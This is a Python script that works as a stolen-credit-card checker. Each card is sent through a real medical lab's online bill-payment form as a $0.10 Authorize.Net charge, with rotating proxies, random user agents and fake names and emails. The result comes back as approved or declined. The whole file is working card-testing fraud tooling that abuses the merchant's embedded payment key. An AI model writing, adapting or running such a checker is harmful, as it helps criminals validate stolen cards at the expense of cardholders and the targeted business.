import requests
import re
import json
import asyncio
from typing import Optional
from faker import Faker
from user_agent import generate_user_agent
from urllib.parse import quote

fake = Faker()

def parse_proxy(proxy_str: str) -> Optional[str]:
    if not proxy_str:
        return None
    clean_proxy = proxy_str.replace("http://", "").replace("https://", "")
    parts = clean_proxy.split(':')
    if len(parts) >= 4 and parts[1].isdigit():
        host, port = parts[0], parts[1]
        user = quote(parts[2], safe='')
        pwd = quote(':'.join(parts[3:]), safe='')
        return f"http://{user}:{pwd}@{host}:{port}"
    elif len(parts) == 2 and parts[1].isdigit():
        return f"http://{clean_proxy}"
    return proxy_str

def _run_authorizenet_auth_sync(cc: str, mes: str, ano: str, cvv: str, proxy_str: Optional[str] = None):
    session = requests.Session()
    if proxy_str:
        proxy_url = parse_proxy(proxy_str)
        if proxy_url:
            session.proxies = {
                'http': proxy_url,
                'https': proxy_url
            }

    u = generate_user_agent()
    name = fake.name()
    email = fake.email()

    try:
        # 1. Fetch form token
        v1 = session.get('https://avanticmedicallab.com/pay-bill-online/', headers={'User-Agent': u}, timeout=20)
        token_match = re.search(r'name="wpforms\[token\]" value="([^"]+)"', v1.text)
        wp_token = token_match.group(1) if token_match else 'ccf1f214e6ae1c99c9bf26c60650bd7f'

        # 2. Get Opaque Data from Authorize.Net
        headers_api = {
            'Accept': '*/*',
            'Accept-Language': 'fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7',
            'Content-Type': 'application/json; charset=UTF-8',
            'Origin': 'https://avanticmedicallab.com',
            'Referer': 'https://avanticmedicallab.com/',
            'User-Agent': u,
        }

        # Normalize expiry date (MMYY format for Authorize.Net)
        exp_year = str(ano)
        exp_year_2d = exp_year[-2:] if len(exp_year) >= 2 else exp_year.zfill(2)
        exp_month = str(mes).zfill(2)
        exp_date_str = f"{exp_month}{exp_year_2d}"

        json_data = {
            'securePaymentContainerRequest': {
                'merchantAuthentication': {
                    'name': '3c5Q9QdJW',
                    'clientKey': '2n7ph2Zb4HBkJkb8byLFm7stgbfd8k83mSPWLW23uF4g97rX5pRJNgbyAe2vAvQu',
                },
                'data': {
                    'type': 'TOKEN',
                    'id': '26f657f1-bad7-782d-6587-eaea7ce8ec60',
                    'token': {
                        'cardNumber': cc,
                        'expirationDate': exp_date_str,
                        'cardCode': cvv,
                    },
                },
            },
        }

        res_api = session.post('https://api2.authorize.net/xml/v1/request.api', headers=headers_api, json=json_data, timeout=20)
        api_text = res_api.content.decode('utf-8-sig')
        api_data = json.loads(api_text)
        
        opaque_value = api_data.get('opaqueData', {}).get('dataValue')
        if not opaque_value:
            return False, "Failed to retrieve opaque token from Authorize.Net"

        # 3. Submit payment via Avantic Medical Lab
        headers_wp = {
            'Accept': 'application/json, text/javascript, */*; q=0.01',
            'Accept-Language': 'fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7',
            'Origin': 'https://avanticmedicallab.com',
            'Referer': 'https://avanticmedicallab.com/pay-bill-online/',
            'User-Agent': u,
            'X-Requested-With': 'XMLHttpRequest',
        }

        files_wp = {
            'wpforms[fields][1][first]': (None, name),
            'wpforms[fields][1][last]': (None, name),
            'wpforms[fields][17]': (None, '0.10'),
            'wpforms[fields][2]': (None, email),
            'wpforms[fields][3]': (None, '(315) 424-8967'),
            'wpforms[fields][14]': (None, ''),
            'wpforms[fields][4][address1]': (None, 'New York 39 Ave'),
            'wpforms[fields][4][city]': (None, 'New York'),
            'wpforms[fields][4][state]': (None, 'NY'),
            'wpforms[fields][4][postal]': (None, '10001'),
            'wpforms[fields][6]': (None, '$ 0.10'),
            'wpforms[fields][11][]': (None, 'By clicking on Pay Now button you have read and agreed to the policies set forth in both the Privacy Policy and the Terms and Conditions pages.'),
            'wpforms[id]': (None, '4449'),
            'wpforms[author]': (None, '1'),
            'wpforms[post_id]': (None, '3388'),
            'wpforms[authorize_net][opaque_data][descriptor]': (None, 'COMMON.ACCEPT.INAPP.PAYMENT'),
            'wpforms[authorize_net][opaque_data][value]': (None, opaque_value),
            'wpforms[authorize_net][card_data][expire]': (None, f"{exp_month}/{exp_year_2d}"),
            'wpforms[token]': (None, wp_token),
            'action': (None, 'wpforms_submit'),
            'page_url': (None, 'https://avanticmedicallab.com/pay-bill-online/'),
            'page_title': (None, 'Pay Bill Online'),
            'page_id': (None, '3388'),
        }

        resp_final = session.post('https://avanticmedicallab.com/wp-admin/admin-ajax.php', cookies=session.cookies, headers=headers_wp, files=files_wp, timeout=25)
        resp_text = resp_final.text

        # Determine success from response
        if '"success":true' in resp_text or 'Payment Successful' in resp_text:
            return True, "CARD_APPROVED"
        
        try:
            res_json = resp_final.json()
            if res_json.get('success') is True:
                return True, "CARD_APPROVED"
            err_msg = res_json.get('data', {}).get('error', {}).get('message', res_json.get('data', {}).get('error'))
            if err_msg:
                return False, err_msg
        except Exception:
            pass

        clean_err = re.sub(r'<[^>]+>', ' ', resp_text).strip()
        clean_err = re.sub(r'\s+', ' ', clean_err)
        if len(clean_err) > 150:
            clean_err = clean_err[:147] + "..."
        return False, clean_err or "Payment declined / failed"

    except Exception as e:
        return False, f"Authorize.Net check failed: {str(e)}"

async def process_authorizenet_auth(cc: str, mes: str, ano: str, cvv: str, proxy_str: Optional[str] = None):
    return await asyncio.to_thread(_run_authorizenet_auth_sync, cc, mes, ano, cvv, proxy_str)
